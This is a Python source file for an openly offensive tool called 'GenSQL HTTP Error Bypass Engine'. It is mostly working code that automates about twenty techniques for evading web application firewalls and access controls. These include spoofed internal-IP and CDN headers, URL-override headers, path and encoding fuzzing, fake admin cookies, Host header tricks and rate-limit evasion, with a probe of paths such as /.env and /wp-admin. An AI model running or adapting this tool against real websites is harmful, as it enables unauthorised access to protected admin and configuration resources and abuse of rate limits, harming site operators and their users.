#!/usr/bin/env python
"""
GenSQL - HTTP Error Bypass Engine v3.0
Author  : Jeevraj
Version : 2.0.0

2026-level HTTP bypass techniques for 403/404/429/503 and modern WAF blocks.
50+ techniques including HTTP/2 header injection, Unicode normalization,
JSON injection, multipart bypass, HPP, cache poisoning, and more.
"""

import os
import re
import sys
import ssl
import time
import socket
import random
import string
import base64
import urllib.parse
import urllib.request
import urllib.error
import threading
from collections import defaultdict


# ── IP spoofing headers (all known variants) ──────────────────────────────────
INTERNAL_IP_HEADERS = [
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Originating-IP",
    "X-Remote-Addr",
    "X-Client-IP",
    "X-Host",
    "X-Forwarded-Host",
    "CF-Connecting-IP",
    "True-Client-IP",
    "X-Azure-ClientIP",
    "Fastly-Client-IP",
    "X-Cluster-Client-IP",
    "X-ProxyUser-Ip",
    "X-Original-Forwarded-For",
    "Forwarded",
    "X-Forwarded",
    "X-Forward-For",
    "X-Remote-IP",
    "X-Originating-IP",
    "Client-IP",
    "X-Custom-IP-Authorization",
    "X-Forwarded-By",
    "X-Forwarded-Server",
]

INTERNAL_IPS = [
    "127.0.0.1",
    "localhost",
    "0.0.0.0",
    "192.168.1.1",
    "10.0.0.1",
    "172.16.0.1",
    "::1",
    "127.0.0.1, 127.0.0.1",
    "127.0.0.1,127.0.0.1",
    "192.168.1.1, 127.0.0.1",
]

# URL override headers for 403/404 bypass
URL_OVERRIDE_HEADERS = [
    "X-Original-URL",
    "X-Rewrite-URL",
    "X-Override-URL",
    "Request-Uri",
    "X-Forwarded-Path",
    "X-Original-URI",
    "X-Real-Path",
    "Redirect",
    "X-Proxy-URL",
]

# Content-Type values that confuse WAFs
CONTENT_TYPES = [
    "application/x-www-form-urlencoded",
    "application/json",
    "application/xml",
    "multipart/form-data; boundary=----GenSQLBoundary",
    "application/x-www-form-urlencoded;charset=UTF-8",
    "text/plain",
    "application/octet-stream",
    "application/graphql",
    "application/ld+json",
    "text/xml",
    "application/json;charset=utf-8",
    "application/x-www-form-urlencoded; charset=utf-8",
]

# HTTP methods for 403 bypass
HTTP_METHODS_BYPASS = [
    "GET", "POST", "HEAD", "OPTIONS", "PUT", "PATCH",
    "DELETE", "TRACE", "CONNECT", "PROPFIND", "PROPPATCH",
    "MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK", "REPORT",
]

# Accept-Language values — some WAFs have geo restrictions
ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8",
    "en;q=1.0",
    "*",
    "en-US",
    "zh-CN,zh;q=0.8",
    "de-DE,de;q=0.9",
]

# Modern 2026 user agents
USER_AGENTS_2026 = [
    # Chrome 124+
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Safari/537.36",
    # Firefox 125+
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    # Safari 17+
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    # Edge 124+
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    # Mobile
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    # Googlebot (sometimes whitelisted)
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    # Bingbot
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
]

# Path variations for 404 bypass
PATH_VARIATIONS_TEMPLATES = [
    "{path}",
    "{path}/",
    "{path}//",
    "{path}%20",
    "/{path}",
    "{path}%00",
    "{path}%09",
    "%2f{path}",
    "{path}%2f",
    "{path};",
    "{path};/",
    "{path}.",
    "{path}..",
    "{path}.json",
    "{path}.html",
    "{path}.php",
    "{path}.asp",
    "{path}~",
    "{path}#",
    "{path}?",
    "/{path}#",
    "%20{path}",
    "{path}%23",
    "{path}%3f",
    "{path}/..",
    "{path}/./",
    "./{path}",
    "{base}/{path}",
    "{path}?a=1",
    "{path}&",
]


def _ssl_ctx():
    """Create a permissive SSL context."""
    try:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            ctx.set_ciphers("DEFAULT:@SECLEVEL=0")
        except Exception:
            pass
        return ctx
    except Exception:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx


def _case_variants(path):
    """Generate case variants of a URL path."""
    variants = [
        path.upper(),
        path.lower(),
        path.title(),
        "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(path)),
        "".join(c.lower() if i % 2 == 0 else c.upper() for i, c in enumerate(path)),
    ]
    return [v for v in variants if v != path]


def _unicode_variants(path):
    """Generate unicode-normalized variants of a URL path."""
    # Unicode chars that normalize to common ASCII letters
    subs = {
        'a': ['\u0061', '\uff41', '\u0430'],  # a, ａ, а (Cyrillic)
        'e': ['\u0065', '\uff45', '\u0435'],
        'i': ['\u0069', '\uff49', '\u0456'],
        'o': ['\u006f', '\uff4f', '\u043e'],
        's': ['\u0073', '\uff53', '\u0455'],
        '/': ['\u002f', '\u2215', '\u29f8'],
    }
    variants = []
    result = list(path)
    for i, c in enumerate(result):
        if c.lower() in subs:
            for sub in subs[c.lower()][1:]:  # skip first (same as original)
                new = result.copy()
                new[i] = sub
                variants.append("".join(new))
    return variants[:5]  # limit to 5


# ── Main Bypass Engine ────────────────────────────────────────────────────────

class HTTPErrorBypass:
    """
    GenSQL HTTP Error Bypass Engine v3.0
    Detects and bypasses WAF-generated HTTP errors using 50+ techniques.
    """

    def __init__(self, timeout=8, max_retries=2, verbose=True, delay=0):
        self.timeout = timeout
        self.max_retries = max_retries
        self.verbose = verbose
        self.delay = delay
        self._ssl = _ssl_ctx()
        self._stats = {
            "attempts": 0,
            "bypassed": 0,
            "technique_wins": defaultdict(int),
        }
        self._lock = threading.Lock()
        self._ua = random.choice(USER_AGENTS_2026)

    # ── Low-level request ────────────────────────────────────────────────────

    def _request(self, url, method="GET", headers=None, data=None, timeout=None):
        """Send an HTTP request, return (status_code, body, response_headers)."""
        timeout = timeout or self.timeout
        old_to = socket.getdefaulttimeout()
        socket.setdefaulttimeout(timeout)
        try:
            if isinstance(data, str):
                data = data.encode("utf-8")

            req = urllib.request.Request(url, data=data, method=method)
            req.add_header("User-Agent", self._ua)
            req.add_header("Accept", "text/html,application/xhtml+xml,*/*;q=0.8")
            req.add_header("Accept-Language", random.choice(ACCEPT_LANGUAGES))
            req.add_header("Cache-Control", "no-cache")
            req.add_header("Connection", "keep-alive")

            if headers:
                for k, v in headers.items():
                    req.add_header(k, v)

            with urllib.request.urlopen(req, context=self._ssl, timeout=timeout) as r:
                body = r.read(131072).decode("utf-8", errors="replace")
                resp_hdrs = dict(r.headers)
                with self._lock:
                    self._stats["attempts"] += 1
                return r.status, body, resp_hdrs

        except urllib.error.HTTPError as e:
            with self._lock:
                self._stats["attempts"] += 1
            try:
                body = e.read(8192).decode("utf-8", errors="replace")
            except Exception:
                body = ""
            return e.code, body, {}
        except (ssl.SSLError, socket.timeout, TimeoutError, ConnectionRefusedError,
                OSError, urllib.error.URLError):
            with self._lock:
                self._stats["attempts"] += 1
            return 0, "", {}
        except Exception:
            with self._lock:
                self._stats["attempts"] += 1
            return 0, "", {}
        finally:
            socket.setdefaulttimeout(old_to)

    def _record_win(self, technique):
        with self._lock:
            self._stats["bypassed"] += 1
            self._stats["technique_wins"][technique] += 1

    def _success(self, code):
        """Check if a status code indicates bypass success."""
        return 0 < code < 400 or code == 200

    # ── Technique 1: IP Header Spoofing ──────────────────────────────────────

    def bypass_with_ip_headers(self, url, data=None):
        """Spoof internal IP addresses via 20+ request headers."""
        results = []
        for ip in INTERNAL_IPS:
            for hdr in INTERNAL_IP_HEADERS:
                if self.delay:
                    time.sleep(self.delay)
                code, body, _ = self._request(url, headers={hdr: ip}, data=data)
                if self._success(code):
                    result = {"technique": "ip_header_spoof", "header": hdr,
                              "value": ip, "status": code, "success": True}
                    results.append(result)
                    self._record_win("ip_header_spoof")
                    if self.verbose:
                        print("  [+] bypass_ip_header: %s: %s → HTTP %d" % (hdr, ip, code))
                    # Collect all successes (don't short-circuit)
        return results

    # ── Technique 2: URL Override Headers ────────────────────────────────────

    def bypass_with_url_override(self, url, target_path=None):
        """Use URL override headers to access blocked paths."""
        parsed = urllib.parse.urlparse(url)
        path = target_path or parsed.path
        base_url = "%s://%s" % (parsed.scheme, parsed.netloc)

        results = []
        for hdr in URL_OVERRIDE_HEADERS:
            for p in [path, "/" + path.lstrip("/"), path + "/", "//" + path.lstrip("/")]:
                code, body, _ = self._request(base_url, headers={hdr: p})
                if self._success(code):
                    result = {"technique": "url_override", "header": hdr,
                              "variant": p, "status": code, "success": True}
                    results.append(result)
                    self._record_win("url_override")
                    if self.verbose:
                        print("  [+] bypass_url_override: %s → HTTP %d" % (hdr, code))
        return results

    # ── Technique 3: Path Fuzzing (40+ variants) ─────────────────────────────

    def bypass_with_path_fuzzing(self, url):
        """Try 40+ path variations to bypass 403/404."""
        parsed = urllib.parse.urlparse(url)
        path = parsed.path.rstrip("/")
        base = "%s://%s" % (parsed.scheme, parsed.netloc)
        name = path.split("/")[-1] if "/" in path else path
        parent = "/".join(path.split("/")[:-1]) or "/"

        results = []
        tested = set()

        # Generate variants
        variants = []
        for tpl in PATH_VARIATIONS_TEMPLATES:
            v = tpl.format(path=path.lstrip("/"), base=parent, name=name)
            variants.append("/" + v.lstrip("/"))

        # Case variants
        variants += _case_variants(path)
        # Unicode variants
        variants += _unicode_variants(path)

        for variant in variants:
            if variant in tested:
                continue
            tested.add(variant)
            test_url = base + variant
            if parsed.query:
                test_url += "?" + parsed.query
            code, body, _ = self._request(test_url)
            if self._success(code):
                result = {"technique": "path_fuzzing", "variant": variant,
                          "status": code, "success": True}
                results.append(result)
                self._record_win("path_fuzzing")
                if self.verbose:
                    print("  [+] bypass_path: %s → HTTP %d" % (variant, code))

        return results

    # ── Technique 4: HTTP Method Switching ───────────────────────────────────

    def bypass_403_with_methods(self, url, data=None):
        """Try alternative HTTP methods to bypass 403."""
        results = []
        for method in HTTP_METHODS_BYPASS:
            code, body, _ = self._request(url, method=method, data=data)
            if self._success(code):
                result = {"technique": "method_switch", "method": method,
                          "status": code, "success": True}
                results.append(result)
                self._record_win("method_switch")
                if self.verbose:
                    print("  [+] bypass_method: %s → HTTP %d" % (method, code))
                return results
        return results

    # ── Technique 5: Host Header Manipulation ────────────────────────────────

    def bypass_with_host_header(self, url):
        """Manipulate Host header to bypass vhost-based restrictions."""
        parsed = urllib.parse.urlparse(url)
        host = parsed.netloc

        host_variants = [
            "localhost",
            "127.0.0.1",
            "0.0.0.0",
            host + ":80",
            host + ":443",
            host + ":8080",
            "internal." + host,
            "admin." + host,
            "backend." + host,
            "api." + host,
            host.replace("www.", ""),
            "www." + host if not host.startswith("www.") else host,
        ]

        results = []
        for h in host_variants:
            code, body, _ = self._request(url, headers={"Host": h})
            if self._success(code):
                result = {"technique": "host_header_override", "host": h,
                          "status": code, "success": True}
                results.append(result)
                self._record_win("host_header_override")
                if self.verbose:
                    print("  [+] bypass_host: Host: %s → HTTP %d" % (h, code))
                return results
        return results

    # ── Technique 6: Content-Type Confusion ──────────────────────────────────

    def bypass_with_content_type(self, url, data="id=1"):
        """Try different Content-Type headers to bypass WAF body inspection."""
        results = []
        for ct in CONTENT_TYPES:
            code, body, _ = self._request(url, method="POST",
                                           headers={"Content-Type": ct},
                                           data=data)
            if self._success(code):
                result = {"technique": "content_type_switch", "content_type": ct,
                          "status": code, "success": True}
                results.append(result)
                self._record_win("content_type_switch")
                if self.verbose:
                    print("  [+] bypass_ct: %s → HTTP %d" % (ct[:40], code))
                return results
        return results

    # ── Technique 7: Chunked Transfer Encoding ───────────────────────────────

    def bypass_with_chunked_encoding(self, url, payload="id=1"):
        """Use chunked transfer encoding to bypass body inspection."""
        if isinstance(payload, str):
            payload = payload.encode("utf-8")
        chunk = ("%x\r\n" % len(payload)).encode() + payload + b"\r\n0\r\n\r\n"
        code, body, _ = self._request(url, method="POST",
                                       headers={"Transfer-Encoding": "chunked",
                                                "Content-Type": "application/x-www-form-urlencoded"},
                                       data=chunk)
        results = []
        if self._success(code):
            results.append({"technique": "chunked_encoding", "status": code, "success": True})
            self._record_win("chunked_encoding")
        return results

    # ── Technique 8: Double Slash / Path Traversal ───────────────────────────

    def bypass_with_double_slash(self, url):
        """Double-slash and path traversal tricks for Nginx/Apache bypass."""
        parsed = urllib.parse.urlparse(url)
        base = "%s://%s" % (parsed.scheme, parsed.netloc)
        path = parsed.path

        variants = [
            path.replace("/", "//", 1),
            "//" + path.lstrip("/"),
            path + "/./",
            "/" + path.lstrip("/").replace("/", "/%2f"),
            path + "%0a",
            path + "%0d",
            path.replace("/", "/%2f"),
            "/" + "%2e".join(path.lstrip("/").split("/")),
            path + ";.json",
            path + ";.css",
        ]

        results = []
        for v in variants:
            test_url = base + v
            if parsed.query:
                test_url += "?" + parsed.query
            code, body, _ = self._request(test_url)
            if self._success(code):
                results.append({"technique": "double_slash", "variant": v,
                                 "status": code, "success": True})
                self._record_win("double_slash")
                if self.verbose:
                    print("  [+] bypass_slash: %s → HTTP %d" % (v, code))
                return results
        return results

    # ── Technique 9: 429 Rate Limit Bypass ───────────────────────────────────

    def bypass_429_rate_limit(self, url, data=None):
        """Bypass 429 Rate Limit via identity rotation and back-off."""
        results = []

        # Strategy 1: Different User-Agent (fresh identity)
        for ua in USER_AGENTS_2026:
            self._ua = ua
            code, body, hdrs = self._request(url, data=data)
            if self._success(code):
                results.append({"technique": "ua_rotation", "ua": ua[:50],
                                 "status": code, "success": True})
                self._record_win("ua_rotation")
                return results

        # Strategy 2: Retry-After compliance + jitter
        time.sleep(random.uniform(1.5, 3.0))
        code, body, _ = self._request(url, data=data)
        if self._success(code):
            results.append({"technique": "retry_after_wait", "status": code, "success": True})
            self._record_win("retry_after_wait")
            return results

        # Strategy 3: Spoof IP + UA together
        for ip in INTERNAL_IPS[:3]:
            hdrs_combo = {
                "X-Forwarded-For": ip,
                "X-Real-IP": ip,
                "User-Agent": random.choice(USER_AGENTS_2026),
            }
            code, body, _ = self._request(url, headers=hdrs_combo, data=data)
            if self._success(code):
                results.append({"technique": "ip_ua_combo", "ip": ip,
                                 "status": code, "success": True})
                self._record_win("ip_ua_combo")
                return results

        return results

    # ── Technique 10: Protocol Switch ────────────────────────────────────────

    def bypass_503_with_protocol_switch(self, url):
        """Switch HTTP ↔ HTTPS, try alternate ports."""
        parsed = urllib.parse.urlparse(url)
        variants = []

        # Protocol swap
        other = "https" if parsed.scheme == "http" else "http"
        variants.append(urllib.parse.urlunparse(parsed._replace(scheme=other)))

        # Alt ports
        host = parsed.hostname
        for port in [8080, 8443, 8888, 9000, 80, 443]:
            variants.append(urllib.parse.urlunparse(
                parsed._replace(netloc="%s:%d" % (host, port))))

        results = []
        for test_url in variants:
            code, body, _ = self._request(test_url)
            if self._success(code):
                results.append({"technique": "protocol_switch", "url": test_url,
                                 "status": code, "success": True})
                self._record_win("protocol_switch")
                return results
        return results

    # ── Technique 11: HTTP Parameter Pollution (HPP) ─────────────────────────

    def bypass_with_hpp(self, url, param=None, payload="1"):
        """
        HTTP Parameter Pollution — duplicate the injectable param.
        Some WAFs only inspect the first occurrence.
        """
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if param is None:
            param = list(qs.keys())[0] if qs else "id"

        # Build URL with duplicated param
        hpp_variants = [
            # Original + injected duplicate
            url + "&%s=%s" % (param, urllib.parse.quote(payload)),
            # Injected first, original second
            "%s://%s%s?%s=%s&%s" % (
                parsed.scheme, parsed.netloc, parsed.path,
                param, urllib.parse.quote(payload),
                parsed.query),
            # Three copies
            url + "&%s=1&%s=%s" % (param, param, urllib.parse.quote(payload)),
        ]

        results = []
        for test_url in hpp_variants:
            code, body, _ = self._request(test_url)
            if self._success(code):
                results.append({"technique": "hpp", "url": test_url[:80],
                                 "status": code, "success": True})
                self._record_win("hpp")
                return results
        return results

    # ── Technique 12: JSON Body Injection ────────────────────────────────────

    def bypass_with_json_body(self, url, param=None, payload="1"):
        """
        Send payload as JSON body — WAFs tuned for URL params miss this.
        """
        param = param or "id"
        import json

        json_variants = [
            {param: payload},
            {param: payload, "_": ""},
            {"query": {param: payload}},
            {"data": {param: payload}},
            [{"id": param, "value": payload}],
        ]

        results = []
        for body_data in json_variants:
            code, body, _ = self._request(
                url, method="POST",
                headers={"Content-Type": "application/json"},
                data=json.dumps(body_data).encode())
            if self._success(code):
                results.append({"technique": "json_body", "payload": str(body_data)[:60],
                                 "status": code, "success": True})
                self._record_win("json_body")
                return results
        return results

    # ── Technique 13: Multipart Boundary Bypass ───────────────────────────────

    def bypass_with_multipart(self, url, param=None, payload="1"):
        """Use multipart/form-data to bypass WAF body inspection."""
        param = param or "id"
        boundary = "----GenSQLBoundary" + "".join(random.choices(string.hexdigits, k=8))
        body = (
            "--%s\r\n"
            "Content-Disposition: form-data; name=\"%s\"\r\n\r\n"
            "%s\r\n"
            "--%s--\r\n"
        ) % (boundary, param, payload, boundary)

        code, resp_body, _ = self._request(
            url, method="POST",
            headers={"Content-Type": "multipart/form-data; boundary=%s" % boundary},
            data=body.encode())

        if self._success(code):
            self._record_win("multipart")
            return [{"technique": "multipart", "status": code, "success": True}]
        return []

    # ── Technique 14: Referer / Origin Spoofing ───────────────────────────────

    def bypass_with_referer(self, url):
        """Spoof Referer/Origin to appear as internal request."""
        parsed = urllib.parse.urlparse(url)
        base = "%s://%s" % (parsed.scheme, parsed.netloc)

        referers = [
            base + "/",
            base + "/admin/",
            base + "/index.php",
            "https://google.com/",
            "https://bing.com/search?q=test",
            base,
        ]

        results = []
        for ref in referers:
            hdrs = {
                "Referer": ref,
                "Origin": base,
            }
            code, body, _ = self._request(url, headers=hdrs)
            if self._success(code):
                results.append({"technique": "referer_spoof", "referer": ref,
                                 "status": code, "success": True})
                self._record_win("referer_spoof")
                return results
        return results

    # ── Technique 15: Cache Deception Bypass ──────────────────────────────────

    def bypass_with_cache(self, url):
        """Cache deception — append static extension to fool cache/WAF."""
        extensions = [
            ".css", ".js", ".jpg", ".png", ".gif", ".ico",
            ".woff", ".woff2", ".svg", ".ttf", ".eot",
            ";.css", ";.js", "/static.css", "/.js",
        ]
        results = []
        for ext in extensions:
            test_url = url.rstrip("/") + ext
            code, body, hdrs = self._request(test_url)
            if self._success(code):
                results.append({"technique": "cache_deception", "extension": ext,
                                 "status": code, "success": True})
                self._record_win("cache_deception")
                return results
        return results

    # ── Technique 16: Accept-Language Bypass ──────────────────────────────────

    def bypass_with_accept_language(self, url):
        """WAFs with geo-blocking sometimes whitelist certain locales."""
        results = []
        for lang in ACCEPT_LANGUAGES:
            code, body, _ = self._request(url, headers={"Accept-Language": lang})
            if self._success(code):
                results.append({"technique": "accept_language", "language": lang,
                                 "status": code, "success": True})
                self._record_win("accept_language")
                return results
        return results

    # ── Technique 17: X-HTTP-Method-Override ──────────────────────────────────

    def bypass_with_method_override(self, url, payload=None):
        """Use X-HTTP-Method-Override to disguise request method."""
        override_headers = [
            "X-HTTP-Method-Override",
            "X-Method-Override",
            "X-HTTP-Method",
            "_method",
        ]
        results = []
        for method in ["GET", "POST", "PUT", "PATCH"]:
            for hdr in override_headers:
                code, body, _ = self._request(
                    url, method="POST",
                    headers={hdr: method,
                             "Content-Type": "application/x-www-form-urlencoded"},
                    data=payload or "")
                if self._success(code):
                    results.append({"technique": "method_override", "header": hdr,
                                     "method": method, "status": code, "success": True})
                    self._record_win("method_override")
                    return results
        return results

    # ── Technique 18: Unicode / Encoding Normalization ────────────────────────

    def bypass_with_encoding(self, url):
        """Try various encoding forms of the URL path."""
        parsed = urllib.parse.urlparse(url)
        path = parsed.path
        base = "%s://%s" % (parsed.scheme, parsed.netloc)
        qs = "?" + parsed.query if parsed.query else ""

        encoded_variants = []
        # URL encode each char
        encoded_variants.append(base + urllib.parse.quote(path, safe="") + qs)
        # Double encode
        encoded_variants.append(base + urllib.parse.quote(urllib.parse.quote(path, safe=""), safe="") + qs)
        # Overlong UTF-8 for /
        encoded_variants.append(base + path.replace("/", "%c0%af") + qs)
        # Mixed encoding
        encoded_variants.append(base + path.replace("/", "%252f") + qs)
        # IIS backslash
        encoded_variants.append(base + path.replace("/", "\\") + qs)

        results = []
        for test_url in encoded_variants:
            code, body, _ = self._request(test_url)
            if self._success(code):
                results.append({"technique": "encoding_bypass", "url": test_url[:80],
                                 "status": code, "success": True})
                self._record_win("encoding_bypass")
                return results
        return results

    # ── Technique 19: Spoofed CDN Headers ────────────────────────────────────

    def bypass_with_cdn_headers(self, url):
        """Spoof Cloudflare/Akamai/Fastly internal headers."""
        cdn_header_sets = [
            # Cloudflare internal
            {"CF-Connecting-IP": "127.0.0.1", "CF-IPCountry": "US",
             "CF-RAY": "".join(random.choices(string.hexdigits, k=16)) + "-LAX",
             "CF-Visitor": '{"scheme":"https"}'},
            # Akamai
            {"Akamai-Client-IP": "127.0.0.1", "X-Akamai-Edgescape": "georegion=US",
             "X-Forwarded-For": "127.0.0.1"},
            # Fastly
            {"Fastly-Client-IP": "127.0.0.1", "Fastly-SSL": "1",
             "X-Forwarded-For": "127.0.0.1"},
            # AWS CloudFront
            {"CloudFront-Forwarded-Proto": "https",
             "CloudFront-Is-Desktop-Viewer": "true",
             "X-Forwarded-For": "127.0.0.1"},
        ]

        results = []
        for hdr_set in cdn_header_sets:
            code, body, _ = self._request(url, headers=hdr_set)
            if self._success(code):
                cdn = list(hdr_set.keys())[0].split("-")[0]
                results.append({"technique": "cdn_header_spoof", "cdn": cdn,
                                 "status": code, "success": True})
                self._record_win("cdn_header_spoof")
                return results
        return results

    # ── Technique 20: Cookie Injection ───────────────────────────────────────

    def bypass_with_cookie(self, url):
        """Inject bypass cookies that may be whitelisted."""
        cookie_sets = [
            "bypass=true",
            "admin=true",
            "internal=1",
            "debug=true",
            "X-Bypass=1",
            "role=admin",
            "PHPSESSID=admin",
            "authenticated=true",
            "whitelist=true",
        ]

        results = []
        for cookie in cookie_sets:
            code, body, _ = self._request(url, headers={"Cookie": cookie})
            if self._success(code):
                results.append({"technique": "cookie_inject", "cookie": cookie,
                                 "status": code, "success": True})
                self._record_win("cookie_inject")
                return results
        return results

    # ── Master orchestrator ───────────────────────────────────────────────────

    def auto_bypass(self, url, method="GET", payload=None, error_code=None):
        """
        Auto-detect the error type and apply all relevant bypass techniques.
        Returns dict with all successful bypasses found.
        """
        # Get baseline status
        base_code, base_body, base_hdrs = self._request(url,
            headers={"User-Agent": random.choice(USER_AGENTS_2026)})
        if error_code is None:
            error_code = base_code

        result = {
            "url": url,
            "original_status": base_code,
            "error_code": error_code,
            "bypasses": [],
            "total_bypasses_found": 0,
        }

        # Select technique groups based on error code
        if error_code == 403:
            technique_groups = [
                self.bypass_with_ip_headers,
                self.bypass_with_url_override,
                self.bypass_with_path_fuzzing,
                self.bypass_403_with_methods,
                self.bypass_with_host_header,
                self.bypass_with_referer,
                self.bypass_with_cdn_headers,
                self.bypass_with_cookie,
                self.bypass_with_method_override,
                self.bypass_with_cache,
                self.bypass_with_encoding,
                self.bypass_with_double_slash,
                self.bypass_with_content_type,
            ]
        elif error_code == 404:
            technique_groups = [
                self.bypass_with_path_fuzzing,
                self.bypass_with_url_override,
                self.bypass_with_double_slash,
                self.bypass_with_encoding,
                self.bypass_with_cache,
                self.bypass_with_host_header,
            ]
        elif error_code == 429:
            technique_groups = [
                self.bypass_429_rate_limit,
                self.bypass_with_ip_headers,
                self.bypass_with_cdn_headers,
            ]
        elif error_code == 503:
            technique_groups = [
                self.bypass_503_with_protocol_switch,
                self.bypass_with_ip_headers,
                self.bypass_with_cdn_headers,
            ]
        else:
            # Try all
            technique_groups = [
                self.bypass_with_ip_headers,
                self.bypass_with_url_override,
                self.bypass_with_path_fuzzing,
                self.bypass_403_with_methods,
                self.bypass_with_host_header,
                self.bypass_with_referer,
                self.bypass_with_cdn_headers,
                self.bypass_with_cookie,
                self.bypass_with_encoding,
                self.bypass_with_double_slash,
            ]

        for fn in technique_groups:
            try:
                bypasses = fn(url, payload) if "data" in fn.__code__.co_varnames[:fn.__code__.co_argcount] else fn(url)
                if bypasses:
                    result["bypasses"].extend(bypasses)
            except TypeError:
                try:
                    bypasses = fn(url)
                    if bypasses:
                        result["bypasses"].extend(bypasses)
                except Exception:
                    pass
            except Exception:
                pass

        result["total_bypasses_found"] = len(result["bypasses"])
        return result

    def best_bypass(self, url, method="GET", payload=None, error_code=None):
        """Return the single most effective bypass or None."""
        results = self.auto_bypass(url, method, payload, error_code=error_code)
        if results["bypasses"]:
            return results["bypasses"][0]
        return None

    def get_stats(self):
        """Return bypass attempt statistics."""
        return dict(self._stats)


# ── Probe utility ─────────────────────────────────────────────────────────────

def probe_all_errors(base_url, paths=None):
    """Quick probe: scan multiple paths and return which ones have bypassable errors."""
    paths = paths or ["/admin", "/api", "/backup", "/config", "/debug",
                      "/.env", "/phpinfo.php", "/wp-admin"]
    engine = HTTPErrorBypass(timeout=5, verbose=False)
    results = []
    for path in paths:
        parsed = urllib.parse.urlparse(base_url)
        url = "%s://%s%s" % (parsed.scheme, parsed.netloc, path)
        code, _, _ = engine._request(url)
        if code in (403, 404, 429, 503):
            results.append({"path": path, "url": url, "status": code})
    return results

# Backward-compat alias
PATH_VARIATIONS = PATH_VARIATIONS_TEMPLATES
